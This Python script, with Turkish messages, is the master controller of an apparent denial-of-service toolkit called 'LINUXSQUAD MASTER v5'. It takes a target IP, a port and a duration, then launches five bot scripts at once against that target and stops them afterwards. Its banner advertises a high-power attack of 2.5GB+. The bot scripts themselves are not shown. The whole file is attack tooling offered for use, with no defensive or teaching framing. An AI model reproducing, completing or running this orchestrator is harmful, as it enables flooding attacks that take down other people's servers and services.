import subprocess
import time
import sys
import os

os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║              LINUXSQUAD MASTER v5 - 5 BOT ULTRA SYSTEM                       ║")
print("║                    5 Bot ile Yüksek Güç Saldırı (2.5GB+ Hedef)               ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")

if len(sys.argv) < 3:
    print("Kullanım: python master.py <HEDEF> <PORT> [SÜRE]")
    print("Örnek  : python master.py 1.1.1.1 80 60")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 90

print(f"\033[91m[+] Master Kontrol Başlatıldı → Hedef: {target}:{port} | Süre: {duration} saniye\033[0m")
print("\033[93m[+] 5 Bot aynı anda başlatılıyor...\033[0m\n")

bots = []
for i in range(1, 6):
    print(f"\033[92m[+] Bot{i} başlatılıyor...\033[0m")
    bot = subprocess.Popen(["python", f"bot{i}.py", target, str(port), str(duration)])
    bots.append(bot)
    time.sleep(1.5)  # Botlar arası hafif ara (sistem yükünü azaltmak için)

print("\n\033[92m[+] TÜM 5 BOT AKTİF! Saldırı devam ediyor...\033[0m")

try:
    time.sleep(duration + 5)  # Biraz fazla bekle ki botlar bitsin
except KeyboardInterrupt:
    print("\n\033[91m[-] Master durduruldu. Tüm botlar kapatılıyor...\033[0m")

for bot in bots:
    bot.terminate()

print("\033[92m[+] Tüm botlar başarıyla durduruldu.\033[0m")
